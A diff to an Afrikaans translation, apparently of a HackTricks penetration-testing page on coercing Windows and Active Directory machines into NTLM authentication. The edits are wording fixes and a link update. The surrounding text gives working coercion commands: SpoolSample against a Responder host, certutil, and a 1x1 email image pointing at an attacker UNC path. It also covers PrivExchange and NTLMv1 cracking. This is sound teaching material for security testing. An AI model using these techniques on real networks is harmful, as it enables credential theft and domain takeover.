@@ -4,12 +4,12 @@
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n **versameling** van **afgeleë autentikasie-triggers** wat in C# gekodeer is met MIDL-kompiler om 3departy afhanklikhede te vermy.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
 
 ## Spooler Service Abuse
 
 As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-akkrediteerings gebruik om 'n **versoek** aan die Domeinbeheerder se drukbediener te doen vir 'n **opdatering** oor nuwe drukwerk en net vir dit te sê om die **kennisgewing na 'n stelsel te stuur**.\
-Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsels stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering gebruik.
+Let daarop dat wanneer die drukker die kennisgewing na 'n arbitrêre stelsel stuur, dit moet **autentiseer teen** daardie **stelsel**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat autentiseer teen 'n arbitrêre stelsel, en die diens sal die **rekenaarrekening** in hierdie autentisering **gebruik**.
 
 ### Finding Windows Servers on the domain
 
@@ -24,13 +24,13 @@ Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScann
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-U kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN Protokol
+Jy kan ook rpcdump.py op Linux gebruik en soek na die MS-RPRN Protokol
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
 ### Vra die diens om teen 'n arbitrêre gasheer te verifieer
 
-Jy kan[ **SpoolSample van hier**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** saamstel.**
+Jy kan [**SpoolSample van hier**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** saamstel.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
@@ -53,11 +53,11 @@ https://github.com/p0dalirius/Coercer
 
 Die `PrivExchange` aanval is 'n gevolg van 'n fout wat in die **Exchange Server `PushSubscription` kenmerk** gevind is. Hierdie kenmerk laat die Exchange-server toe om deur enige domein gebruiker met 'n posbus gedwing te word om aan enige kliënt-gelewer gasheer oor HTTP te outentiseer.
 
-Standaard, die **Exchange diens loop as SYSTEM** en word oormatige voorregte gegee (specifiek, dit het **WriteDacl voorregte op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan benut word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheers binne die domein te outentiseer. Die suksesvolle benutting van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
+Standaard, die **Exchange diens loop as SYSTEM** en word oormatige voorregte gegee (specifiek, dit het **WriteDacl voorregte op die domein voor-2019 Kumulatiewe Opdatering**). Hierdie fout kan misbruik word om die **oorplasing van inligting na LDAP moontlik te maak en gevolglik die domein NTDS databasis te onttrek**. In gevalle waar oorplasing na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om oor te plaas en aan ander gasheer binne die domein te outentiseer. Die suksesvolle misbruik van hierdie aanval bied onmiddellike toegang tot die Domein Admin met enige geoutentiseerde domein gebruiker rekening.
 
 ## Binne Windows
 
-As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind met behulp van voorregte rekeninge met: 
+As jy reeds binne die Windows masjien is, kan jy Windows dwing om met 'n bediener te verbind met bevoorregte rekeninge deur: 
 
 ### Defender MpCmdRun
 ```bash
@@ -82,7 +82,7 @@ Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-
 
 ### Certutil
 
-Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentisering te dwing:
+Dit is moontlik om certutil.exe lolbin (Microsoft-onderteken binêre) te gebruik om NTLM-outeentifikasie te dwing:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -90,7 +90,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### Deur e-pos
 
-As jy die **e-posadres** van die gebruiker wat in 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy net vir hom 'n **e-pos met 'n 1x1 beeld** stuur soos
+As jy die **e-posadres** van die gebruiker wat binne 'n masjien aanmeld wat jy wil kompromitteer, ken, kan jy net vir hom 'n **e-pos met 'n 1x1 beeld** stuur soos
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,7 +104,7 @@ As jy 'n MitM-aanval op 'n rekenaar kan uitvoer en HTML in 'n bladsy kan inspuit
 ```
 ## Kraking NTLMv1
 
-As jy [NTLMv1 uitdagings kan vang, lees hier hoe om hulle te kraak](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember dat jy om NTLMv1 te kraak die Responder-uitdaging moet stel op "1122334455667788"_
+As jy [NTLMv1 uitdagings kan vang, lees hier hoe om hulle te kraak](../ntlm/index.html#ntlmv1-attack).\
+&#xNAN;_&#x52;onthou dat jy om NTLMv1 te kraak die Responder-uitdaging moet stel op "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
